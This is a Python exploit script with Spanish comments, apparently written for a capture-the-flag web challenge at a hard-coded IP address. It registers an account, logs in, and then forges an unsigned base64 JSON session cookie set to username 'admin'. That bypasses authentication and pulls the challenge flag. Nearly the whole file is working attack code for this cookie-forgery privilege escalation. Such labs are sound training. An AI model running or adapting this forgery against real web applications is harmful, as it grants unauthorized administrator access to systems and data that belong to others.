#!/usr/bin/python3

import requests
import signal
import pdb
import sys
import time
import re

from base64 import b64encode
from pwn import *

def cerrando(sig, frame):
		print("\n[*] Saliendo...\n")
		sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, cerrando)

# Varible Global
main_url = "http://64.227.39.115:30734/"
reg_url = "register"
login_url = "auth/login"

burp = {'http': 'http://127.0.0.1:8080'}

def Register():

	p1 = log.progress("Ejecutando Registro de Usuario")

	post_data = {
		'username': 'hack',
		'password': 'hack123'
	}

	mainUrl = main_url + reg_url
	r = requests.post(mainUrl, data=post_data)
	p1.status("Completado")
	time.sleep(1)

def Login():

	p2 = log.progress("Ejecutando Login")

	login_data = {
		'username': 'hack',
		'password': 'hack123'
	}

	mainUrl = main_url + login_url

	# Procedo a verificar mi PHPSESSID Cookie Creada y comprobamos con Burpsuite que es la Misma
	r = requests.post(mainUrl, data=login_data) #  proxies=burp)
	data = re.findall(r'You are not an admin', r.text)[0]

	p2 = log.progress("Leyendo Respuesta del Servidor, Verificando La Cookie con Burpsuite")
	print(data)

	# Tratamiento en Base64
	cookie = '{"username":"hack"}'
	cookie = cookie.encode()
	cookie = b64encode(cookie).decode()
	p2.status('PHPSESSID=%s' % cookie)
	time.sleep(8)
	p2.status("La Cookie es la Misma, Cambiemos su Valor de Usuario a admin")
	time.sleep(4)

def exploit():

	p3 = log.progress("Autenticandonos con la Nueva PHPSESSID Username = admin")

	login_data = {
		'username': 'hack',
		'password': 'hack123'
	}

	p3.status("Creando la nueva Cookie")
	time.sleep(1)
	new_cookie = '{"username":"admin"}'
	new_cookie = new_cookie.encode()
	new_cookie = b64encode(new_cookie).decode()
	p3.status("PHPSESSID=%s" % new_cookie)
	time.sleep(4)
	cookies =  {

		'PHPSESSID':'%s' % new_cookie
	}

	mainUrl = main_url + login_url

	r = requests.post(mainUrl, data=login_data, cookies=cookies) #  proxies=burp)

	data = r.text
	data = re.findall(r'\t<h1>(.*?)</h1>\n\t', r.text)[0]
	p3.status("Obteniendo la Flag del Reto")
	time.sleep(2)
	print(data)


if __name__ == '__main__':

	Register()
	Login()
	exploit()
